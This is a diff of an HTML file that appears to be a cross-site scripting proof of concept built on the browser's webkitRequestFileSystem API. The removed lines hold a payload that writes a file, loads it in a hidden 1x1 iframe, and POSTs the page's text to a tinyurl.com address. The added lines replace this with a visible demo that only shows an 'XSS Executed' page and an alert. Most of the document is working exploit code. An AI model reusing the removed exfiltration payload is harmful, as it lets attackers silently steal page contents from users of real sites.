@@ -44,32 +44,40 @@
 </body>
 </html>
  -->
-123
-<script>
-webkitRequestFileSystem(TEMPORARY, 1024 * 1024, function(fs) {
-  fs.root.getFile('xss.html', { create: true }, function(fileEntry) {
-    fileEntry.createWriter(function(writer) {
-      const payload = `
-        <style>*{color:red;font-size:30px}</style>
-        <script>
-          fetch('https://tinyurl.com/yz885dsu/xss', {
-            method: 'POST',
-            body: JSON.stringify({ body: document.body.innerText })
-          });
-        <\/script>
-      `;
-      writer.write(new Blob([payload], { type: 'text/html' }));
-      writer.onwriteend = function() {
-        const url = fileEntry.toURL();
-        const iframe = document.createElement('iframe');
-        iframe.src = url;
-        iframe.width = 1;
-        iframe.height = 1;
-        iframe.style = "display:none";
-        document.body.appendChild(iframe);
-      };
-    });
-  });
-});
-</script>
+1234
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Filesystem XSS PoC</title>
+</head>
+<body>
+  <h2>Filesystem XSS Test</h2>
 
+  <script>
+    webkitRequestFileSystem(TEMPORARY, 1024 * 1024, function(fs) {
+      fs.root.getFile('exploit.html', { create: true }, function(entry) {
+        entry.createWriter(function(writer) {
+          const html = `<html>
+  <body style="background:black;color:lime;font-size:32px;">
+    <h1>XSS Executed</h1>
+    <script>alert('PWNED')</` + `script>
+  </body>
+</html>`;
+          writer.write(new Blob([html], { type: 'text/html' }));
+
+          writer.onwriteend = function() {
+            const iframe = document.createElement('iframe');
+            iframe.src = entry.toURL();
+            iframe.width = "100%";
+            iframe.height = "300";
+            iframe.style.border = "3px solid lime";
+            document.body.appendChild(iframe);
+          };
+        });
+      });
+    }, function(err) {
+      console.error('Filesystem request failed:', err);
+    });
+  </script>
+</body>
+</html>
